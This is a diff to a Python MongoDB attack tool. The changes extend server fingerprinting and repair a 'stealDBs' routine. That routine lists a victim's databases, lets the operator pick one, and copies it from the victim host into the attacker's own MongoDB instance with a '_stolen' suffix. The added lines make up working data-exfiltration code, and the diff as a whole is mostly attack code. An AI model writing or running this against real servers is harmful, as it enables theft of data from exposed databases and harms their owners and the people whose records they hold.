@@ -55,14 +55,22 @@ class MongoConnection:
 
     def getServerInfo(self):
         self.serverInfo = self.doSingleOperation("server_info")
-        interestingData=["sysInfo","version",]
-        m=""
+        interestingData=["sysInfo","version","bits",]
+        m="\n"
         #for el in self.serverInfo:
         #    m+="\n%s: %s" %(el, self.serverInfo[el])
         for el in interestingData:
-            m+="\n%s: %s" %(el, self.serverInfo[el])
+            #m+="\n%s: %s" %(el, self.serverInfo[el])
+            if el == "sysInfo":
+                m+= "Mongo Build Info: " + str(self.serverInfo["sysInfo"]) + "\n"
+            
+            elif el == "version":
+                m+= "Mongo DB Version: " + str(self.serverInfo["version"]) + "\n"
+            
+            elif el == "bits":
+                m+= "Platform: " + str(self.serverInfo["bits"]) + " bit\n"
         return m+"\n"
-
+        
     def stealDBs(self, options):
 
         if options.myIP=="" or options.myPort==-1 or options.victim=="":
@@ -70,7 +78,7 @@ class MongoConnection:
 
         if not hasattr(self, "dbList"):
             self.getDbList()
-        m="DB founds:"
+        m="List of databases:"
         menuItem=1
         dbDict={}
         for dbName in self.dbList:
@@ -87,10 +95,19 @@ class MongoConnection:
         dbLoot=int(choice)-1
         #Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
 
-        self.myDBConn = MongoClient(options.myIP,options.myPort)
-        myDBConn.copy_database(dbList[dbLoot],dbList[dbLoot] + "_stolen",victim)
-        m="Database %s stolen!" %(dbList[dbLoot])
-        Logger.success(m)
+        self.conn = MongoClient(options.myIP,27017)
+        
+        try:
+            self.conn.copy_database(self.dbList[dbLoot],self.dbList[dbLoot] + "_stolen", options.victim)
+            m="Database %s stolen!" %(self.dbList[dbLoot])
+            Logger.success(m)
+
+        except:
+            if  str(sys.exc_info()).index("text search not enabled") != -1:
+                print "The database was cloned, but text indexing is not enabled on the destination.  Index not moved."
+            
+            else:
+                print "something went wrong.  Verify your MongoDB is running and the database does not already exist."
 
     def getDbList(self):
         self.dbList=self.doSingleOperation("database_names")
